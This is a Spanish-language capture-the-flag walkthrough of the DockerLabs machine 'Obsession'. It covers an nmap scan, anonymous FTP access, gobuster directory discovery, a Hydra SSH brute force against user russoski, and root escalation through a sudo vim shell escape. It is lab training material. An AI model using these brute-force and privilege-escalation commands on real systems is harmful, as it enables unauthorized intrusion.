
# Máquina Obsession

![inicio](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/inicioObsession.png)


Esta sin duda ha sido una máquina muy interesante, con varias cosas por analizar. Su nombre lo dice todo: *Obsession*. Vamos a ello.

## Escaneo de puertos

Comenzamos con un escaneo utilizando `nmap`:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -sV -vvv -n -Pn 172.17.0.2
```

Los resultados muestran tres puertos abiertos:
- **21 (FTP)**
- **22 (SSH)**
- **80 (HTTP)**

Vamos a investigar qué encontramos en el puerto 21.

## Exploración en FTP

Nos conectamos al servicio FTP con las siguientes credenciales:

```bash
ftp 172.17.0.2
```

Usamos `anonymous` como usuario y contraseña:

```text
Usuario: anonymous
Contraseña: anonymous
```

Una vez dentro, listamos los archivos con:

```bash
ls
```

Aparecen dos archivos:
- `chat-gonza.txt`
- `pendientes.txt`

Descargamos ambos con:

```bash
mget *.txt
```

Ahora revisamos su contenido:

```bash
cat chat-gonza.txt
cat pendientes.txt
```

![ftp](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/descargaFTPObsession.png)



El primer archivo contiene una conversación extraña. En `pendientes.txt` se menciona que deben cambiar algunas configuraciones porque no son seguras. Seguimos investigando.

## Exploración en el puerto 80 (HTTP)

Accedemos al puerto 80 y encontramos una página web relacionada con informática y entrenamiento en el gimnasio. 


![web](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/webObsession.png)
![web](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/web2Obsession.png)


Para descubrir más archivos ocultos, usamos `Gobuster`:

```bash
gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,py,bak,php.bak,html
```

El escaneo nos revela varios directorios, pero dos destacan:
- **/backup**
- **/important**

En **important** encontramos un documento titulado *MANIFESTO HACKER*. Interesante, pero seguimos con **backup**.

En este directorio descubrimos un usuario: `russoski`. Ahora vamos a intentar obtener su contraseña.

## Ataque de fuerza bruta con Hydra

Usamos `Hydra` para realizar un ataque de fuerza bruta sobre el servicio SSH:

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

Obtenemos la contraseña: **iloveme**.

## Acceso por SSH

Nos conectamos con las credenciales obtenidas:

```bash
ssh russoski@172.17.0.2
```

Una vez dentro, verificamos los privilegios con:

```bash
sudo -l
```

Vemos que `vim` se puede ejecutar con privilegios elevados. Buscamos en GTFOBins y encontramos una forma de escalar privilegios:

```bash
sudo vim -c ':!/bin/sh'
```

Ejecutamos el comando y obtenemos acceso como **root**. Confirmamos con:

```bash
whoami
```

Ahora tenemos control total sobre la máquina.

Esta máquina fue bastante entretenida y nos permitió practicar varias técnicas:
- Uso de *nmap* para reconocimiento
- Enumeración de archivos en *FTP*
- Fuerza bruta con *Hydra*
- Escalada de privilegios con *VIM*

También hay algunos archivos interesantes por revisar, como una imagen de Tesla y el GitHub del creador de la máquina. Si no la has intentado aún, te recomiendo hacerlo.


⚠ **Este material es solo para aprendizaje y CTFs legales. No lo uses en sistemas sin autorización.**
---

**En mi pagina web (Blog) subo las maquinas más a detalle, normalmento lo hago primero alla por quien guste puede checarlo de aquel lado tambien.** 

https://elyoxsecurity.com/category/maquinas/


Hasta la próxima, hackers.

